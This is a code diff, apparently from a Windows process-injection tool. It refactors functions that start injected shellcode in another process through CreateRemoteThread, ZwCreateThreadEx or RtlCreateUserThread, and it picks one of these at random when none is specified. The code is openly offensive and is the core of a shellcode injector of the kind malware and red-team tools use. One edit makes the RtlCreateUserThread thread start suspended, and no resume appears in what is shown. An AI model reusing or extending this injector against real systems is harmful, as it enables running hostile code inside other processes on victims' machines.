@@ -3,6 +3,14 @@
 #include "ntddk.h"
 #include "ntdll_undoc.h"
 
+typedef enum {
+    usingRandomMethod,
+    usingCreateRemoteThread,
+    usingZwCreateThreadEx,
+    usingRtlCreateUserThread,
+    CREATION_METHODS_SIZE
+} THREAD_CREATION_METHOD;
+
 bool run_shellcode_in_new_thread1(HANDLE hProcess, LPVOID remote_shellcode_ptr)
 {
     NTSTATUS status = NULL;
@@ -44,7 +52,7 @@ bool run_shellcode_in_new_thread3(HANDLE hProcess, LPVOID remote_shellcode_ptr)
     CLIENT_ID cid;
     //create a new thread for the injected code:
     
-    if ((status = RtlCreateUserThread(hProcess, NULL, false, 0, 0, 0, remote_shellcode_ptr, NULL, &hMyThread, &cid)) != STATUS_SUCCESS)
+    if ((status = RtlCreateUserThread(hProcess, NULL, true, 0, 0, 0, remote_shellcode_ptr, NULL, &hMyThread, &cid)) != STATUS_SUCCESS)
     {
         printf("[ERROR] RtlCreateUserThread failed, status : %x\n", status);
         return false;
@@ -56,22 +64,22 @@ bool run_shellcode_in_new_thread3(HANDLE hProcess, LPVOID remote_shellcode_ptr)
 }
 
 //---
-bool run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr, DWORD method = 0)
+bool run_shellcode_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr, DWORD method)
 {
     bool isSuccess = false;
-    const SIZE_T method_max = 3;
-    DWORD random = (GetTickCount() * 1000) % method_max + 1;
-    if (method > method_max || method < 1) method = random;
+    DWORD max = CREATION_METHODS_SIZE - 1;
+    DWORD random = (GetTickCount() * 1000) % max + 1;
+    if (method > max || method <= usingRandomMethod) method = random;
 
     printf("Injecting by method, id = %x\n", method);
     switch (method) {
-    case 1:
+    case usingCreateRemoteThread:
         isSuccess = run_shellcode_in_new_thread1(hProcess, remote_shellcode_ptr);
         break;
-    case 2:
+    case usingZwCreateThreadEx:
         isSuccess = run_shellcode_in_new_thread2(hProcess, remote_shellcode_ptr);
         break;
-    case 3:
+    case usingRtlCreateUserThread:
         isSuccess = run_shellcode_in_new_thread3(hProcess, remote_shellcode_ptr);
         break;
     default:
